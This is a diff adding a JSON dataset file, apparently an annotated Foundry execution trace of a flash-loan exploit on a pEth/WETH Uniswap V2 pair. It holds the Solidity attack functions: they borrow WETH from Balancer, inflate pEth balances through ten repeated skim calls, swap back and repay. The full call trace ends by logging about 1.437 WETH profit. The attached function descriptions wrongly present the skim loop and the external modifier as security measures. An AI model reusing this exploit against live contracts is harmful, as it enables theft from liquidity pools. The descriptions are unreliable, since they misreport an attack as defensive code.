@@ -1,0 +1,618 @@
+[
+    {
+        "id": "23756",
+        "args": "",
+        "original_code": "    function testExploit() external {\n        uint256 startWETH = WETH.balanceOf(address(this));\n        console.log(\"Before Start: %d WETH\", startWETH);\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = amount;\n        Balancer.flashLoan(address(this), tokens, amounts, \"\");\n\n        uint256 intRes = WETH.balanceOf(address(this)) / 1 ether;\n        uint256 decRes = WETH.balanceOf(address(this)) - intRes * 1e18;\n        console.log(\"Attack Exploit: %s.%s WETH\", intRes, decRes);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `testExploit` function is designed to simulate an attack or exploit scenario using a flash loan. It starts by checking the current balance of WETH (Wrapped Ether) held by the contract. Then, it sets up a flash loan request for a specific amount of WETH from the Balancer protocol. After executing the flash loan, it calculates and logs the new WETH balance, breaking it into integer and decimal parts for clarity.\n\n2. **Security mechanism:**  \n   The function does not explicitly include security modifiers or defense measures. However, it relies on the external `Balancer.flashLoan` function, which likely has its own security checks and mechanisms to ensure the loan is repaid. The function also uses `console.log` for debugging purposes, which can help in monitoring the process but does not provide security.\n\n3. **Parameter Function:**  \n   The function does not take any direct parameters. However, it uses predefined variables like `WETH` (the Wrapped Ether token contract) and `amount` (the quantity of WETH to borrow). These variables are crucial for setting up the flash loan request and performing the balance calculations.\n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it logs the results of the exploit simulation. It calculates the WETH balance after the flash loan and splits it into two parts: the integer portion (`intRes`) and the decimal portion (`decRes`). These values are then logged to provide a detailed view of the balance changes.\n\n**In summary,**  \nThe `testExploit` function simulates a flash loan-based exploit by borrowing WETH, performing an operation, and then logging the resulting balance. It relies on external systems for security and uses predefined variables to execute the process. The function is primarily for testing or demonstration purposes, as it does not include explicit security measures or return values.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "513309",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "\"Before Start: %d WETH\", 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "487822",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [51970861731879316502999 [5.197e22]], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51970861731879316502999 [5.197e22]"
+    },
+    {
+        "id": "2350",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "25962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 51970861731879316502999 [5.197e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "438513",
+        "args": "[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [51970861731879316502999 [5.197e22]], [0], 0x",
+        "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        address[] memory path = new address[](2);\n        (path[0], path[1]) = (address(WETH), address(pEth));\n        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amounts[0], 0, path, address(this), type(uint256).max\n        );\n        uint256 pEth_amount = pEth.balanceOf(address(this));\n        pEth.transfer(address(UNIPair), pEth_amount);\n\n        for (uint256 i = 0; i < 10; i++) {\n            UNIPair.skim(address(UNIPair));\n        }\n\n        (path[0], path[1]) = (address(pEth), address(WETH));\n        pEth_amount = pEth.balanceOf(address(this));\n        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            pEth_amount, 0, path, address(this), type(uint256).max\n        );\n\n        WETH.transfer(address(Balancer), amount);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   This function is designed to handle a flash loan, which is a type of loan where borrowed funds are used and repaid within the same transaction. The function first swaps one token (WETH) for another (pEth) using a decentralized exchange router. It then transfers the pEth tokens to a specific pair address and performs a \"skim\" operation multiple times to adjust the token balances in the pair. After that, it swaps the pEth tokens back to WETH and finally repays the flash loan by transferring the WETH to the Balancer contract.\n\n2. **Security mechanism**:  \n   The function uses the `external` modifier, which means it can only be called from outside the contract, ensuring it cannot be invoked internally. Additionally, the function relies on the `transfer` method to move tokens, which is a standard and secure way to handle token transfers. The repeated \"skim\" operation (10 times) is likely a defensive measure to ensure accurate balance adjustments in the token pair.\n\n3. **Parameter Function**:  \n   - `tokens`: An array of token addresses involved in the flash loan.  \n   - `amounts`: An array of amounts corresponding to the tokens borrowed in the flash loan.  \n   - `feeAmounts`: An array of fee amounts associated with the flash loan.  \n   - `userData`: Additional data that can be passed to the function for custom logic.  \n   These parameters provide the necessary details about the flash loan, such as which tokens are borrowed, how much is borrowed, and any associated fees.\n\n4. **Return description**:  \n   This function does not return any value. Its purpose is to execute a series of operations (swapping tokens, transferring tokens, and repaying the loan) within a single transaction. The logic ensures that the flash loan is repaid by the end of the function execution.\n\n**In summary**, this function manages a flash loan by swapping tokens, adjusting balances, and repaying the loan in a single transaction. It uses security measures like external access control and secure token transfers to ensure safe execution. The parameters provide the necessary details for the flash loan, and the function does not return any value as it focuses on completing the loan process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "102051",
+        "args": "51970861731879316502999 [5.197e22], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10225",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 51970861731879316502999 [5.197e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7831",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1537965509184617860 [1.537e18], 1459789552765232477 [1.459e18], 1687933859 [1.687e9]"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "66934",
+        "args": "1537922181095525778 [1.537e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "31246",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1537922181095525778 [1.537e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3831",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "43328089092082 [4.332e13]"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "1831",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1537922181095525778 [1.537e18]"
+    },
+    {
+        "id": "1831",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1537922181095525778 [1.537e18]"
+    },
+    {
+        "id": "4546",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 1537922181095525778 [1.537e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "65398",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1831",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1537965509184617860 [1.537e18]"
+    },
+    {
+        "id": "52912",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 1537922181095525778 [1.537e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "20991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "4589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11537965509184617860 [1.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 11537922181095525778 [1.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "21537965509184617860 [2.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 21537922181095525778 [2.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "31537965509184617860 [3.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 31537922181095525778 [3.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "41537965509184617860 [4.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 41537922181095525778 [4.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51537965509184617860 [5.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 51537922181095525778 [5.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "61537965509184617860 [6.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 61537922181095525778 [6.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "71537965509184617860 [7.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 71537922181095525778 [7.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "81537965509184617860 [8.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 81537922181095525778 [8.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18991",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "91537965509184617860 [9.153e19]"
+    },
+    {
+        "id": "5747",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 91537922181095525778 [9.153e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972321521432081735476 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1831",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "56842",
+        "args": "0, 0, [0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "7147",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "43328089092082 [4.332e13], 51972321521432081735476 [5.197e22], 1696760447 [1.696e9]"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "101537965509184617860 [1.015e20]"
+    },
+    {
+        "id": "38392",
+        "args": "0, 51972299277168324394969 [5.197e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 51972299277168324394969 [5.197e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2589",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "101537965509184617860 [1.015e20]"
+    },
+    {
+        "id": "534",
+        "args": "Uniswap V2: pEth: [0x2033B54B6789a963A02BfCbd40A46816770f1161]",
+        "original_code": null,
+        "description": null,
+        "return_value": "22244263757340507 [2.224e16]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51972299277168324394969 [5.197e22]"
+    },
+    {
+        "id": "3262",
+        "args": "Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 51970861731879316502999 [5.197e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "51970861731879316502999 [5.197e22]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1437545289007891970 [1.437e18]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1437545289007891970 [1.437e18]"
+    },
+    {
+        "id": "0",
+        "args": "\"Attack Exploit: %s.%s WETH\", 1, 437545289007891970 [4.375e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
